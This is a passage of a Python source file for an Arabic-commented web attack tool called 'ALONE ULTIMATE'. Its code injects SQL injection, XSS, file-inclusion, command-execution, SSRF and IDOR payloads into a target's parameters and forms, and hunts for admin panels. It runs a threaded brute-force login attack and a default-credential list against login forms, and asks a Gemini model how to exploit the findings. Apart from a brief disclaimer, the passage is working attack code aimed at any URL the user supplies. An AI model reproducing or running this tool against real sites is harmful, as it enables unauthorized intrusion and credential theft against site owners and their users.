            powered_by = headers.get('X-Powered-By', '')
            
            # كشف السيرفر
            if 'apache' in server.lower():
                techs.append({'type': 'Web Server', 'name': 'Apache', 'version': server})
            elif 'nginx' in server.lower():
                techs.append({'type': 'Web Server', 'name': 'Nginx', 'version': server})
            elif 'iis' in server.lower():
                techs.append({'type': 'Web Server', 'name': 'IIS', 'version': server})
            
            # كشف لغة البرمجة
            if powered_by:
                techs.append({'type': 'Technology', 'name': powered_by})
            
            if 'php' in response.text.lower() or '.php' in url:
                techs.append({'type': 'Language', 'name': 'PHP'})
            elif 'asp.net' in response.text.lower() or '.aspx' in url:
                techs.append({'type': 'Language', 'name': 'ASP.NET'})
            elif 'jsp' in response.text.lower() or '.jsp' in url:
                techs.append({'type': 'Language', 'name': 'JSP'})
            
            # كشف نظام إدارة المحتوى
            if 'wp-content' in response.text or 'wp-includes' in response.text:
                techs.append({'type': 'CMS', 'name': 'WordPress'})
            elif 'joomla' in response.text.lower():
                techs.append({'type': 'CMS', 'name': 'Joomla'})
            elif 'drupal' in response.text.lower():
                techs.append({'type': 'CMS', 'name': 'Drupal'})
            elif 'magento' in response.text.lower():
                techs.append({'type': 'CMS', 'name': 'Magento'})
            
            # كشف قاعدة البيانات
            if 'mysql' in response.text.lower():
                techs.append({'type': 'Database', 'name': 'MySQL'})
            elif 'postgresql' in response.text.lower():
                techs.append({'type': 'Database', 'name': 'PostgreSQL'})
            elif 'microsoft sql server' in response.text.lower() or 'mssql' in response.text.lower():
                techs.append({'type': 'Database', 'name': 'MSSQL'})
            
            # عرض النتائج
            for tech in techs:
                self.print_message(f"  • {tech['type']}: {tech['name']}", 'green')
            
        except Exception as e:
            self.print_message(f"  ❌ Error: {str(e)}", 'red')
        
        return techs
    
    # ==================== دوال متقدمة لاختبار الثغرات ====================
    
    def advanced_sqli_scanner(self, url):
        """ماسح متقدم لثغرات SQL Injection"""
        self.print_message(f"\n[🗄️] Advanced SQL Injection Scanner on {url}", 'cyan', True)
        
        vulnerabilities = []
        
        # فحص الباراميترز في الـ URL
        if '?' in url:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param_name, param_values in params.items():
                self.print_message(f"\n[🔍] Testing parameter: {param_name}", 'yellow')
                
                for payload_type, payloads in self.payloads['sqli'].items():
                    for payload in payloads[:3]:  # جرب أول 3 بيلودات من كل نوع
                        test_url = url.replace(f"{param_name}={param_values[0]}", 
                                              f"{param_name}={quote(payload)}")
                        
                        try:
                            start_time = time.time()
                            response = self.session.get(test_url, timeout=10, verify=False)
                            response_time = time.time() - start_time
                            
                            # فحص Error Based
                            for sign in self.vuln_keywords['sqli']:
                                if sign.lower() in response.text.lower():
                                    vuln = {
                                        'type': 'SQL Injection',
                                        'subtype': 'Error Based',
                                        'url': test_url,
                                        'parameter': param_name,
                                        'payload': payload,
                                        'evidence': sign
                                    }
                                    vulnerabilities.append(vuln)
                                    self.print_message(f"  ✅ Found: {param_name} - {payload_type}", 'green')
                                    break
                            
                            # فحص Time Based
                            if response_time > 5:
                                vuln = {
                                    'type': 'SQL Injection',
                                    'subtype': 'Time Based',
                                    'url': test_url,
                                    'parameter': param_name,
                                    'payload': payload,
                                    'response_time': response_time
                                }
                                vulnerabilities.append(vuln)
                                self.print_message(f"  ⏱️  Time Based: {param_name} - {response_time:.2f}s", 'yellow')
                            
                        except:
                            continue
        
        # فحص الفورم
        if self.forms:
            self.print_message(f"\n[🔍] Testing {len(self.forms)} forms for SQLi", 'yellow')
            
            for form in self.forms:
                for payload in self.payloads['sqli']['error_based'][:5]:
                    data = {}
                    for inp in form['inputs']:
                        if inp['type'] == 'text' or inp['type'] == 'textarea':
                            data[inp['name']] = payload
                        else:
                            data[inp['name']] = inp['value']
                    
                    try:
                        if form['method'] == 'POST':
                            response = self.session.post(form['url'], data=data, timeout=5, verify=False)
                        else:
                            response = self.session.get(form['url'], params=data, timeout=5, verify=False)
                        
                        for sign in self.vuln_keywords['sqli']:
                            if sign.lower() in response.text.lower():
                                vuln = {
                                    'type': 'SQL Injection',
                                    'subtype': 'Form Based',
                                    'url': form['url'],
                                    'form': form,
                                    'payload': payload,
                                    'evidence': sign
                                }
                                vulnerabilities.append(vuln)
                                self.print_message(f"  ✅ SQLi in form at {form['url']}", 'green')
                                break
                    except:
                        continue
        
        self.vulnerabilities.extend(vulnerabilities)
        return vulnerabilities
    
    def advanced_xss_scanner(self, url):
        """ماسح متقدم لثغرات XSS"""
        self.print_message(f"\n[📜] Advanced XSS Scanner on {url}", 'cyan', True)
        
        vulnerabilities = []
        
        # فحص الباراميترز
        if '?' in url:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param_name, param_values in params.items():
                self.print_message(f"\n[🔍] Testing parameter: {param_name}", 'yellow')
                
                for payload_type, payloads in self.payloads['xss'].items():
                    for payload in payloads[:3]:
                        test_url = url.replace(f"{param_name}={param_values[0]}", 
                                              f"{param_name}={quote(payload)}")
                        
                        try:
                            response = self.session.get(test_url, timeout=5, verify=False)
                            
                            # فحص Reflection
                            if payload in response.text:
                                vuln = {
                                    'type': 'XSS',
                                    'subtype': f'Reflected - {payload_type}',
                                    'url': test_url,
                                    'parameter': param_name,
                                    'payload': payload
                                }
                                vulnerabilities.append(vuln)
                                self.print_message(f"  ✅ XSS found: {param_name}", 'green')
                                break
                            
                            # فحص الدمج
                            decoded_payload = payload.replace('<', '&lt;').replace('>', '&gt;')
                            if decoded_payload in response.text:
                                vuln = {
                                    'type': 'XSS',
                                    'subtype': 'Maybe encoded',
                                    'url': test_url,
                                    'parameter': param_name,
                                    'payload': payload,
                                    'note': 'Payload appears encoded but might be exploitable'
                                }
                                vulnerabilities.append(vuln)
                                self.print_message(f"  ⚠️  Possible XSS (encoded): {param_name}", 'yellow')
                                
                        except:
                            continue
        
        return vulnerabilities
    
    def advanced_lfi_scanner(self, url):
        """ماسح متقدم لثغرات LFI"""
        self.print_message(f"\n[📁] Advanced LFI Scanner on {url}", 'cyan', True)
        
        vulnerabilities = []
        
        if '?' in url:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param_name, param_values in params.items():
                self.print_message(f"\n[🔍] Testing parameter: {param_name}", 'yellow')
                
                for lfi_type, payloads in self.payloads['lfi'].items():
                    for payload in payloads:
                        test_url = url.replace(f"{param_name}={param_values[0]}", 
                                              f"{param_name}={payload}")
                        
                        try:
                            response = self.session.get(test_url, timeout=5, verify=False)
                            
                            for sign in self.vuln_keywords['lfi']:
                                if sign.lower() in response.text.lower():
                                    vuln = {
                                        'type': 'LFI',
                                        'subtype': lfi_type,
                                        'url': test_url,
                                        'parameter': param_name,
                                        'payload': payload,
                                        'evidence': sign
                                    }
                                    vulnerabilities.append(vuln)
                                    self.print_message(f"  ✅ LFI found: {param_name} - {lfi_type}", 'green')
                                    break
                                    
                        except:
                            continue
        
        return vulnerabilities
    
    def advanced_rce_scanner(self, url):
        """ماسح متقدم لثغرات RCE"""
        self.print_message(f"\n[💻] Advanced RCE Scanner on {url}", 'cyan', True)
        
        vulnerabilities = []
        
        if '?' in url:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param_name, param_values in params.items():
                self.print_message(f"\n[🔍] Testing parameter: {param_name}", 'yellow')
                
                for rce_type, payloads in self.payloads['rce'].items():
                    for payload in payloads:
                        test_url = url.replace(f"{param_name}={param_values[0]}", 
                                              f"{param_name}={quote(payload)}")
                        
                        try:
                            response = self.session.get(test_url, timeout=5, verify=False)
                            
                            for sign in self.vuln_keywords['rce']:
                                if sign.lower() in response.text.lower():
                                    vuln = {
                                        'type': 'RCE',
                                        'subtype': rce_type,
                                        'url': test_url,
                                        'parameter': param_name,
                                        'payload': payload,
                                        'evidence': sign
                                    }
                                    vulnerabilities.append(vuln)
                                    self.print_message(f"  ✅ RCE found: {param_name} - {rce_type}", 'green')
                                    break
                                    
                        except:
                            continue
        
        return vulnerabilities
    
    def test_ssrf(self, url):
        """اختبار SSRF"""
        self.print_message(f"\n[🌍] Testing SSRF on {url}", 'cyan', True)
        
        vulnerabilities = []
        
        if '?' in url:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param_name, param_values in params.items():
                for payload in self.payloads['ssrf']:
                    test_url = url.replace(f"{param_name}={param_values[0]}", 
                                          f"{param_name}={quote(payload)}")
                    
                    try:
                        response = self.session.get(test_url, timeout=5, verify=False)
                        
                        # فحص استجابة من خدمات داخلية
                        if 'root:' in response.text or 'metadata' in response.text:
                            vuln = {
                                'type': 'SSRF',
                                'url': test_url,
                                'parameter': param_name,
                                'payload': payload
                            }
                            vulnerabilities.append(vuln)
                            self.print_message(f"  ✅ SSRF found: {param_name}", 'green')
                            
                    except:
                        continue
        
        return vulnerabilities
    
    def test_idor(self, url):
        """اختبار IDOR"""
        self.print_message(f"\n[🔐] Testing IDOR on {url}", 'cyan', True)
        
        vulnerabilities = []
        
        if '?' in url:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param_name, param_values in params.items():
                if 'id' in param_name.lower() or 'user' in param_name.lower():
                    self.print_message(f"\n[🔍] Testing parameter: {param_name}", 'yellow')
                    
                    original_value = param_values[0]
                    
                    for payload in self.payloads['idor']:
                        test_url = url.replace(f"{param_name}={original_value}", 
                                              f"{param_name}={payload}")
                        
                        try:
                            response = self.session.get(test_url, timeout=5, verify=False)
                            
                            if response.status_code == 200:
                                if 'not found' not in response.text.lower() and 'error' not in response.text.lower():
                                    if 'profile' in response.text.lower() or 'user' in response.text.lower():
                                        vuln = {
                                            'type': 'IDOR',
                                            'url': test_url,
                                            'parameter': param_name,
                                            'original': original_value,
                                            'tested': payload
                                        }
                                        vulnerabilities.append(vuln)
                                        self.print_message(f"  ✅ IDOR found: {param_name} - {payload}", 'green')
                                        
                        except:
                            continue
        
        return vulnerabilities
    
    # ==================== دوال Admin Hunter المتقدمة ====================
    
    def advanced_admin_hunter(self, base_url):
        """صياد متقدم للوحات التحكم"""
        self.print_message(f"\n[👑] Advanced Admin Hunter on {base_url}", 'orange', True)
        
        found_panels = []
        parsed = urlparse(base_url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        
        # توسيع قائمة المسارات
        extended_paths = []
        for path in self.admin_paths:
            extended_paths.append(path)
            extended_paths.append(path + '/')
            extended_paths.append(path + '.php')
            extended_paths.append(path + '.html')
            extended_paths.append(path + '.asp')
            extended_paths.append(path + '.aspx')
            extended_paths.append(path + '.jsp')
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = []
            for path in extended_paths:
                test_url = urljoin(base, path)
                futures.append(executor.submit(self.check_admin_panel, test_url))
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    found_panels.append(result)
                    
                    if result['status'] == 200:
                        self.print_message(f"  ✅ Admin panel: {result['url']}", 'green')
                    elif result['status'] in [301, 302, 303, 307]:
                        self.print_message(f"  🔄 Redirect: {result['url']}", 'yellow')
        
        self.admin_panels = found_panels
        self.print_message(f"\n[📊] Total admin panels found: {len(found_panels)}", 'cyan', True)
        return found_panels
    
    def check_admin_panel(self, url):
        """فحص لوحة تحكم واحدة"""
        try:
            response = self.session.get(url, timeout=3, allow_redirects=False, verify=False)
            self.stats['requests_sent'] += 1
            
            # كلمات مفتاحية للوحات التحكم
            admin_keywords = [
                'admin', 'dashboard', 'login', 'username', 'password',
                'sign in', 'log in', 'administrator', 'cpanel', 'panel',
                'control panel', 'management', 'backend', 'secure',
                'authorization', 'authentication', 'loginform',
                'user login', 'admin login', 'member login'
            ]
            
            if response.status_code == 200:
                page_text = response.text.lower()
                for keyword in admin_keywords:
                    if keyword in page_text:
                        return {
                            'url': url,
                            'status': response.status_code,
                            'type': 'Admin Panel',
                            'keyword_matched': keyword
                        }
                return {
                    'url': url,
                    'status': response.status_code,
                    'type': 'Possible Admin',
                    'note': 'Status 200 but no clear keywords'
                }
                    
            elif response.status_code in [301, 302, 303, 307]:
                redirect_url = response.headers.get('Location', '')
                return {
                    'url': url,
                    'status': response.status_code,
                    'type': 'Redirect',
                    'redirect': redirect_url
                }
                
        except:
            pass
        return None
    
    def advanced_brute_force(self, admin_url, username_field='username', password_field='password', threads=5):
        """هجوم متقدم متعدد الخيوط لكسر كلمات المرور"""
        self.print_message(f"\n[💣] Advanced Brute Force Attack on {admin_url}", 'red', True)
        self.print_message(f"[⚡] Threads: {threads} | Password list: {len(self.common_passwords)}", 'yellow')
        
        # تحليل الفورم أولاً
        form_info = self.analyze_login_form(admin_url)
        if not form_info:
            self.print_message("[❌] Could not analyze login form", 'red')
            return []
        
        target_url = form_info['action']
        method = form_info['method']
        fields = form_info['fields']
        
        self.print_message(f"[ℹ️] Form action: {target_url}", 'cyan')
        self.print_message(f"[ℹ️] Method: {method}", 'cyan')
        
        # توسيع قائمة اليوزرنيم
        usernames = ['admin', 'administrator', 'root', 'user', 'test', 
                     'guest', 'support', 'info', 'webmaster', 'sysadmin']
        
        cracked = []
        total_attempts = len(usernames) * len(self.common_passwords)
        attempts = 0
        lock = threading.Lock()
        
        def brute_worker(username, password):
            nonlocal attempts
            try:
                # تجهيز البيانات
                data = {}
                for field in fields:
                    if field['type'] == 'username':
                        data[field['name']] = username
                    elif field['type'] == 'password':
                        data[field['name']] = password
                    else:
                        data[field['name']] = field.get('value', '')
                
                # إرسال الطلب
                if method == 'post':
                    response = self.session.post(target_url, data=data, allow_redirects=False, timeout=3, verify=False)
                else:
                    response = self.session.get(target_url, params=data, allow_redirects=False, timeout=3, verify=False)
                
                self.stats['requests_sent'] += 1
                
                with lock:
                    attempts += 1
                    progress = (attempts / total_attempts) * 100
                    sys.stdout.write(f'\r{self.c(f"[⏳] Progress: {progress:.1f}%", "yellow")} {self.c(f"Trying: {username}:{password}", "cyan")}')
                    sys.stdout.flush()
                
                # كشف النجاح
                if response.status_code in [302, 303, 307]:
                    redirect = response.headers.get('Location', '')
                    if 'dashboard' in redirect.lower() or 'home' in redirect.lower():
                        return {'username': username, 'password': password, 'method': 'redirect', 'redirect': redirect}
                
                elif response.status_code == 200:
                    fail_keywords = ['invalid', 'wrong', 'incorrect', 'failed', 'error', 'denied']
                    success_keywords = ['welcome', 'dashboard', 'success', 'logged in', 'profile']
                    
                    page_text = response.text.lower()
                    
                    if any(keyword in page_text for keyword in success_keywords):
                        return {'username': username, 'password': password, 'method': 'success_page'}
                    elif not any(keyword in page_text for keyword in fail_keywords):
                        return {'username': username, 'password': password, 'method': 'possible_success', 'note': 'Check manually'}
                        
            except:
                pass
            return None
        
        # تنفيذ الهجوم المتوازي
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for username in usernames:
                for password in self.common_passwords:
                    futures.append(executor.submit(brute_worker, username, password))
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    cracked.append(result)
                    print()  # سطر جديد
                    self.print_message(f"\n✅ SUCCESS! {result['username']}:{result['password']} [{result['method']}]", 'green', True)
        
        print()  # سطر جديد
        self.cracked_credentials.extend(cracked)
        return cracked
    
    def analyze_login_form(self, url):
        """تحليل نموذج تسجيل الدخول"""
        try:
            response = self.session.get(url, timeout=5, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # البحث عن أول فورم
            form = soup.find('form')
            if not form:
                return None
            
            action = form.get('action', '')
            if action:
                action_url = urljoin(url, action)
            else:
                action_url = url
            
            method = form.get('method', 'post').lower()
            
            # تحليل الحقول
            fields = []
            inputs = form.find_all('input')
            
            for inp in inputs:
                field_type = inp.get('type', 'text')
                field_name = inp.get('name', '')
                field_value = inp.get('value', '')
                
                if field_type == 'password':
                    fields.append({'name': field_name, 'type': 'password', 'value': field_value})
                elif field_type in ['text', 'email']:
                    fields.append({'name': field_name, 'type': 'username', 'value': field_value})
                elif field_type == 'hidden':
                    fields.append({'name': field_name, 'type': 'hidden', 'value': field_value})
                else:
                    fields.append({'name': field_name, 'type': field_type, 'value': field_value})
            
            # البحث عن حقول إضافية
            textareas = form.find_all('textarea')
            for ta in textareas:
                fields.append({'name': ta.get('name', ''), 'type': 'textarea', 'value': ta.get('value', '')})
            
            selects = form.find_all('select')
            for sel in selects:
                fields.append({'name': sel.get('name', ''), 'type': 'select', 'value': ''})
            
            return {
                'action': action_url,
                'method': method,
                'fields': fields
            }
            
        except Exception as e:
            self.print_message(f"[DEBUG] Form analysis error: {str(e)}", 'red')
            return None
    
    def default_creds_tester(self, url):
        """اختبار بيانات الدخول الافتراضية"""
        self.print_message(f"\n[🔑] Testing default credentials on {url}", 'cyan', True)
        
        # قائمة باليوزرنيم والباسورد الافتراضية
        default_creds = [
            {'username': 'admin', 'password': 'admin'},
            {'username': 'admin', 'password': '1234'},
            {'username': 'admin', 'password': '12345'},
            {'username': 'admin', 'password': 'password'},
            {'username': 'administrator', 'password': 'administrator'},
            {'username': 'root', 'password': 'root'},
            {'username': 'root', 'password': 'toor'},
            {'username': 'user', 'password': 'user'},
            {'username': 'guest', 'password': 'guest'},
            {'username': 'test', 'password': 'test'},
            {'username': 'support', 'password': 'support'},
            {'username': 'admin', 'password': '123456'},
            {'username': 'admin', 'password': 'admin123'},
            {'username': 'admin', 'password': 'admin@123'},
            {'username': 'Admin', 'password': 'Admin123'},
            {'username': 'tomcat', 'password': 'tomcat'},
            {'username': 'admin', 'password': 'tomcat'},
            {'username': 'manager', 'password': 'manager'},
            {'username': 'jenkins', 'password': 'jenkins'}
        ]
        
        form_info = self.analyze_login_form(url)
        if not form_info:
            self.print_message("[❌] No login form found", 'red')
            return []
        
        found = []
        for creds in default_creds:
            try:
                data = {}
                for field in form_info['fields']:
                    if field['type'] == 'username':
                        data[field['name']] = creds['username']
                    elif field['type'] == 'password':
                        data[field['name']] = creds['password']
                    else:
                        data[field['name']] = field.get('value', '')
                
                if form_info['method'] == 'post':
                    response = self.session.post(form_info['action'], data=data, allow_redirects=False, timeout=3)
                else:
                    response = self.session.get(form_info['action'], params=data, allow_redirects=False, timeout=3)
                
                if response.status_code in [302, 303]:
                    found.append(creds)
                    self.print_message(f"  ✅ Default credentials: {creds['username']}:{creds['password']}", 'green')
                    
            except:
                continue
        
        return found
    
    # ==================== دوال تحليل متقدمة ====================
    
    def advanced_source_analyzer(self, url):
        """محلل متقدم لكود المصدر"""
        self.print_message(f"\n[🔬] Advanced Source Code Analysis on {url}", 'pink', True)
        
        vulnerabilities = []
        
        try:
            response = self.session.get(url, timeout=10, verify=False)
            source = response.text
            soup = BeautifulSoup(source, 'html.parser')
            
            # 1. البحث عن تعليقات حساسة
            comments = soup.find_all(text=lambda text: isinstance(text, str) and ('<!--' in text or '//' in text))
            for comment in comments[:20]:
                comment_text = str(comment)
                sensitive_words = ['TODO', 'FIXME', 'BUG', 'HACK', 'password', 'pass', 'user', 'admin', 
                                  'key', 'secret', 'token', 'api', 'private', 'confidential']
                
                for word in sensitive_words:
                    if word.lower() in comment_text.lower():
                        vuln = {
                            'type': 'Sensitive Comment',
                            'word': word,
                            'evidence': comment_text[:100]
                        }
                        vulnerabilities.append(vuln)
                        self.print_message(f"  ⚠️  Comment contains '{word}'", 'yellow')
                        break
            
            # 2. البحث عن مسارات API
            api_patterns = [
                r'api_key\s*=\s*[\'"](.*?)[\'"]',
                r'apikey\s*=\s*[\'"](.*?)[\'"]',
                r'API_KEY\s*=\s*[\'"](.*?)[\'"]',
                r'api\.key\s*=\s*[\'"](.*?)[\'"]',
                r'token\s*=\s*[\'"](.*?)[\'"]',
                r'secret\s*=\s*[\'"](.*?)[\'"]'
            ]
            
            for pattern in api_patterns:
                matches = re.findall(pattern, source)
                for match in matches[:3]:
                    vuln = {
                        'type': 'Hardcoded API Key',
                        'evidence': match[:20]
                    }
                    vulnerabilities.append(vuln)
                    self.print_message(f"  🔴 Found hardcoded API key: {match[:20]}...", 'red')
            
            # 3. البحث عن ملفات JavaScript
            scripts = soup.find_all('script', src=True)
            for script in scripts:
                js_url = script['src']
                if js_url.startswith('http'):
                    self.js_files.append(js_url)
                else:
                    full_js_url = urljoin(url, js_url)
                    self.js_files.append(full_js_url)
            
            # 4. تحليل ملفات JavaScript
            for js_url in self.js_files[:5]:  # حلل أول 5 ملفات JS
                try:
                    js_response = self.session.get(js_url, timeout=5, verify=False)
                    js_content = js_response.text
                    
                    # البحث عن endpoints في JS
                    endpoint_patterns = [
                        r'["\'](/api/.*?)["\']',
                        r'["\'](/v\d/.*?)["\']',
                        r'["\'](/rest/.*?)["\']',
                        r'url:\s*["\'](.*?)["\']',
                        r'fetch\(["\'](.*?)["\']',
                        r'ajax\(.*?url:\s*["\'](.*?)["\']'
                    ]
                    
                    for pattern in endpoint_patterns:
                        matches = re.findall(pattern, js_content)
                        for match in matches[:3]:
                            if match not in self.api_endpoints:
                                self.api_endpoints.append(match)
                                self.print_message(f"  📡 Found API endpoint: {match}", 'cyan')
                                
                except:
                    continue
            
            # 5. تحليل بالذكاء الاصطناعي للنتائج المهمة
            if vulnerabilities:
                self.animate_thinking(2)
                ai_prompt = f"""
                تم تحليل كود مصدر الموقع {url} واكتشاف الثغرات التالية:
                {json.dumps(vulnerabilities, indent=2)}
                
                كخبير أمني متقدم، حلل هذه الثغرات وأعط:
                1. تقييم خطورة كل ثغرة
                2. طريقة استغلال محتملة
                3. نصائح للإصلاح
                
                باللغة العربية مع تفاصيل تقنية دقيقة.
                """
                
                ai_analysis = self.ask_gemini(ai_prompt)
                self.print_message(f"\n🤖 AI Analysis:", 'purple', True)
                self.type_text(ai_analysis, 0.02)
            
            return vulnerabilities
            
        except Exception as e:
            self.print_message(f"[❌] Error in source analysis: {str(e)}", 'red')
            return []
    
    # ==================== دوال التقرير والإحصائيات ====================
    
    def generate_detailed_report(self, url, scan_results):
        """توليد تقرير مفصل"""
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        filename = f"ALONE_Report_{timestamp}.txt"
        
        report = f"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                     ALONE ULTIMATE - SECURITY AUDIT REPORT                    ║
╚══════════════════════════════════════════════════════════════════════════════╝

Target URL: {url}
Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Scan Duration: {scan_results.get('duration', 'N/A')}

════════════════════════════════════════════════════════════════════════════════
📊 SCAN STATISTICS
════════════════════════════════════════════════════════════════════════════════
• URLs Crawled: {self.stats['urls_crawled']}
• Vulnerabilities Found: {len(self.vulnerabilities)}
• Admin Panels Found: {len(self.admin_panels)}
• Credentials Cracked: {len(self.cracked_credentials)}
• Requests Sent: {self.stats['requests_sent']}
• Errors Encountered: {self.stats['errors']}

════════════════════════════════════════════════════════════════════════════════
🔍 VULNERABILITIES SUMMARY
════════════════════════════════════════════════════════════════════════════════
"""
        
        # تصنيف الثغرات
        vuln_types = {}
        for vuln in self.vulnerabilities:
            vtype = vuln.get('type', 'Unknown')
            if vtype not in vuln_types:
                vuln_types[vtype] = []
            vuln_types[vtype].append(vuln)
        
        for vtype, vulns in vuln_types.items():
            report += f"\n[{vtype}] - {len(vulns)} found:\n"
            for vuln in vulns[:5]:  # أول 5 ثغرات من كل نوع
                report += f"  • {vuln.get('url', 'N/A')} - {vuln.get('parameter', 'N/A')}\n"
        
        report += f"""

════════════════════════════════════════════════════════════════════════════════
👑 ADMIN PANELS FOUND
════════════════════════════════════════════════════════════════════════════════
"""
        
        for panel in self.admin_panels:
            report += f"  • {panel['url']} [{panel.get('type', 'Unknown')}]\n"
        
        if self.cracked_credentials:
            report += f"""

════════════════════════════════════════════════════════════════════════════════
🔑 CRACKED CREDENTIALS
════════════════════════════════════════════════════════════════════════════════
"""
            for cred in self.cracked_credentials:
                report += f"  • {cred['username']}:{cred['password']}\n"
        
        report += f"""

════════════════════════════════════════════════════════════════════════════════
📝 DISCOVERED ASSETS
════════════════════════════════════════════════════════════════════════════════
• Total URLs: {len(self.discovered_urls)}
• Forms: {len(self.forms)}
• JS Files: {len(self.js_files)}
• API Endpoints: {len(self.api_endpoints)}
• Subdomains: {len(self.subdomains)}

════════════════════════════════════════════════════════════════════════════════
🤖 AI RECOMMENDATIONS
════════════════════════════════════════════════════════════════════════════════
"""
        
        # طلب توصيات من الذكاء الاصطناعي
        ai_prompt = f"""
        بناءً على نتائج الفحص الأمني للموقع {url}:
        - عدد الثغرات: {len(self.vulnerabilities)}
        - أنواع الثغرات: {list(vuln_types.keys())}
        - عدد لوحات التحكم: {len(self.admin_panels)}
        
        أعط توصيات أمنية شاملة بالعربية تشمل:
        1. الإجراءات العاجلة المطلوبة
        2. أفضل الممارسات الأمنية
        3. كيفية منع هذه الثغرات مستقبلاً
        """
        
        ai_recommendations = self.ask_gemini(ai_prompt)
        report += ai_recommendations
        
        report += f"""

════════════════════════════════════════════════════════════════════════════════
📜 DISCLAIMER
════════════════════════════════════════════════════════════════════════════════
This report is generated for authorized security testing only.
The user is responsible for complying with all applicable laws.

Report generated by ALONE ULTIMATE v5.0
════════════════════════════════════════════════════════════════════════════════
"""
        
        # حفظ التقرير
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(report)
        
        self.print_message(f"\n[✅] Report saved to: {filename}", 'green', True)
        return filename
    
    # ==================== دوال مساعدة ====================
    
    def print_message(self, text, color='white', bold=False, delay=0.03):
        """طباعة نص مع لون"""
        colored_text = self.c(text, color, bold)
        print(colored_text)
    
    def type_text(self, text, delay=0.03):
        """كتابة تدريجية"""
        for char in text:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(delay)
        print()
    
    def animate_thinking(self, seconds=2):
        """أنيميشن التفكير"""
        frames = ["◴", "◷", "◶", "◵"]
        end_time = time.time() + seconds
        while time.time() < end_time:
            for frame in frames:
                sys.stdout.write(f'\r{self.c(frame, "yellow")} {self.c("ALONE is thinking...", "cyan")}')
                sys.stdout.flush()
                time.sleep(0.1)
        print('\r' + ' ' * 50, end='\r')
    
    def ask_gemini(self, prompt):
        """التواصل مع الذكاء الاصطناعي"""
        try:
            payload = {
                "contents": [{"parts": [{"text": prompt}]}]
            }
            response = self.session.post(
                self.url,
                headers={'Content-Type': 'application/json'},
                data=json.dumps(payload),
                timeout=30
            )
            
            if response.status_code == 200:
                result = response.json()
                return result['candidates'][0]['content']['parts'][0]['text']
            return f"Error: {response.status_code}"
        except Exception as e:
            return f"AI Error: {str(e)}"
    
    def show_stats(self):
        """عرض الإحصائيات"""
        stats_text = f"""
{self.c('══════════════════════════════════════════════════════════════════', 'cyan')}
{self.c('📊 CURRENT STATISTICS', 'green', True)}
{self.c('══════════════════════════════════════════════════════════════════', 'cyan')}

{self.c('• URLs Crawled:', 'yellow')}          {self.c(str(self.stats['urls_crawled']), 'cyan')}
{self.c('• Vulnerabilities:', 'yellow')}        {self.c(str(len(self.vulnerabilities)), 'red')}
{self.c('• Admin Panels:', 'yellow')}           {self.c(str(len(self.admin_panels)), 'orange')}
{self.c('• Cracked Credentials:', 'yellow')}    {self.c(str(len(self.cracked_credentials)), 'green')}
{self.c('• Requests Sent:', 'yellow')}          {self.c(str(self.stats['requests_sent']), 'cyan')}
{self.c('• Forms Found:', 'yellow')}            {self.c(str(len(self.forms)), 'cyan')}
{self.c('• JS Files:', 'yellow')}               {self.c(str(len(self.js_files)), 'cyan')}
{self.c('• API Endpoints:', 'yellow')}          {self.c(str(len(self.api_endpoints)), 'cyan')}
{self.c('• Subdomains:', 'yellow')}             {self.c(str(len(self.subdomains)), 'cyan')}
{self.c('• Errors:', 'yellow')}                 {self.c(str(self.stats['errors']), 'red')}

{self.c('══════════════════════════════════════════════════════════════════', 'cyan')}
        """
        print(stats_text)
    
    # ==================== الدالة الرئيسية ====================
    
    def run(self):
        """تشغيل البوت الرئيسي"""
        self.print_banner()
        
        while True:
            self.print_menu()
            
            choice = input(f"\n{self.c('⚡', 'red')} {self.c('ALONE', 'cyan', True)} {self.c('>>', 'yellow')} ").strip()
            
            if choice == '0':
                self.print_message("\n👋 Thank you for using ALONE Ultimate! Stay secure!", 'yellow', True)
                break
            
            elif choice == '1':  # Full Scan
                url = input(f"{self.c('[?]', 'cyan')} Enter target URL: ").strip()
                if not url.startswith('http'):
                    url = 'http://' + url
                
                start_time = time.time()
                
                # 1. Crawler
                self.advanced_crawler(url, depth=2)
                
                # 2. Tech Detection
                self.tech_detection(url)
                
                # 3. Admin Hunter
                panels = self.advanced_admin_hunter(url)
                
                # 4. Vulnerability Scanning
                self.advanced_sqli_scanner(url)
                self.advanced_xss_scanner(url)
                self.advanced_lfi_scanner(url)
                self.advanced_rce_scanner(url)
                self.test_ssrf(url)
                self.test_idor(url)
                
                # 5. Source Analysis
                self.advanced_source_analyzer(url)
                
                # 6. Sensitive Files
                self.sensitive_files_scanner(url)
                
                end_time = time.time()
                duration = end_time - start_time
                
                # 7. Generate Report
                scan_results = {
                    'url': url,
                    'duration': f"{duration:.2f} seconds",
                    'vulnerabilities': self.vulnerabilities
                }
                self.generate_detailed_report(url, scan_results)
                
                # Save to history
                self.scan_history.append({
                    'url': url,
                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'vulns_count': len(self.vulnerabilities),
                    'admin_panels': len(self.admin_panels)
                })
            
            elif choice == '3':  # Advanced Crawler
                url = input(f"{self.c('[?]', 'cyan')} Enter target URL: ").strip()
                if not url.startswith('http'):
                    url = 'http://' + url
                
                depth = input(f"{self.c('[?]', 'cyan')} Crawl depth (default: 3): ").strip()
                depth = int(depth) if depth.isdigit() else 3
                
                self.advanced_crawler(url, depth)
            
            elif choice == '4':  # Admin Hunter
                url = input(f"{self.c('[?]', 'cyan')} Enter target URL: ").strip()
                if not url.startswith('http'):
                    url = 'http://' + url
                
                self.advanced_admin_hunter(url)
            
            elif choice == '5':  # Brute Force
                url = input(f"{self.c('[?]', 'cyan')} Enter admin login URL: ").strip()
                if not url.startswith('http'):
                    url = 'http://' + url
                
